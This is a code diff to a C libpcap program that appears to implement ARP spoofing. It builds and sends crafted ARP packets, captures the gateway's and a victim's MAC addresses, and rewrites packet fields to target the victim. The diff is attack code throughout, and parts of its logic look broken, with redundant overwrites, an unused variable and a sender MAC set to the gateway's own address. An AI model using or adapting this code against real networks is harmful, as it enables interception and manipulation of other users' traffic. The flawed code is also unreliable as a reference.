@@ -98,9 +98,14 @@ int main(int argc, char* argv[])
     ioctl(fd,SIOCGIFHWADDR,&s);
     //memcpy(send_first.SouMac,s.ifr_addr.sa_data,6);
 
+
+    uint8_t my_mac[6];
     for(i=0;i<6;i++){
         send_first.SouMac[i] = (uint8_t)s.ifr_addr.sa_data[i];
     }
+
+
+    memcpy(send_first.SenderMac,send_first.SouMac,6);
 
 
     fd = socket(AF_INET,SOCK_DGRAM,0);
@@ -119,6 +124,8 @@ int main(int argc, char* argv[])
 
 
     //printf("%s\n",(const u_char*)&send_first);
+
+    //=======================================================================first send========================================//
     if(pcap_sendpacket(handle,(const u_char*)&send_first,42) != 0)
     {
         printf("error");
@@ -129,17 +136,22 @@ int main(int argc, char* argv[])
 
     struct arp_pac *p1;
 
-    p1 = (struct arp_pac *)packet;
+
 
     struct pcap_pkthdr* header;
     int res=pcap_next_ex(handle, &header, &packet);
-
+    p1 = (struct arp_pac *)packet;
+    //===============get gateway_mac================
 
     uint8_t gate_mac_addr[6];
+
     for(i=0;i<6;i++)
     {
         gate_mac_addr[i] = p1->SenderMac[i];
     }
+
+
+    memcpy(gate_mac_addr,p1->SouMac,6);
 
 
     for(i=0; i<4; i++){
@@ -153,21 +165,30 @@ int main(int argc, char* argv[])
     }
 
     res=pcap_next_ex(handle, &header, &packet);
+    p1 = (struct arp_pac *)packet;
 
 
     uint8_t vic_mac_addr[6];
+
     for(i=0;i<6;i++)
     {
-        vic_mac_addr[i] = p1->SenderMac[i];
+       vic_mac_addr[i] = p1->SenderMac[i];
+    }
+
+    //last send
+    //vic_mac_addr my_mac_addr
+    for(i=0;i<6;i++)
+    {
+        send_first.DesMac[i] = vic_mac_addr[i];
     }
 
 
-    ioctl(fd,SIOCGIFHWADDR,&s);
 
     for(i=0; i<6; i++)
     {
-        send_first.SenderMac[i]=(uint8_t)s.ifr_addr.sa_data[i];
+        send_first.SenderMac[i]=gate_mac_addr[i];
     }
+
     for(i=0; i<6;i++){
         send_first.DesMac[i] = vic_mac_addr[i];
     }
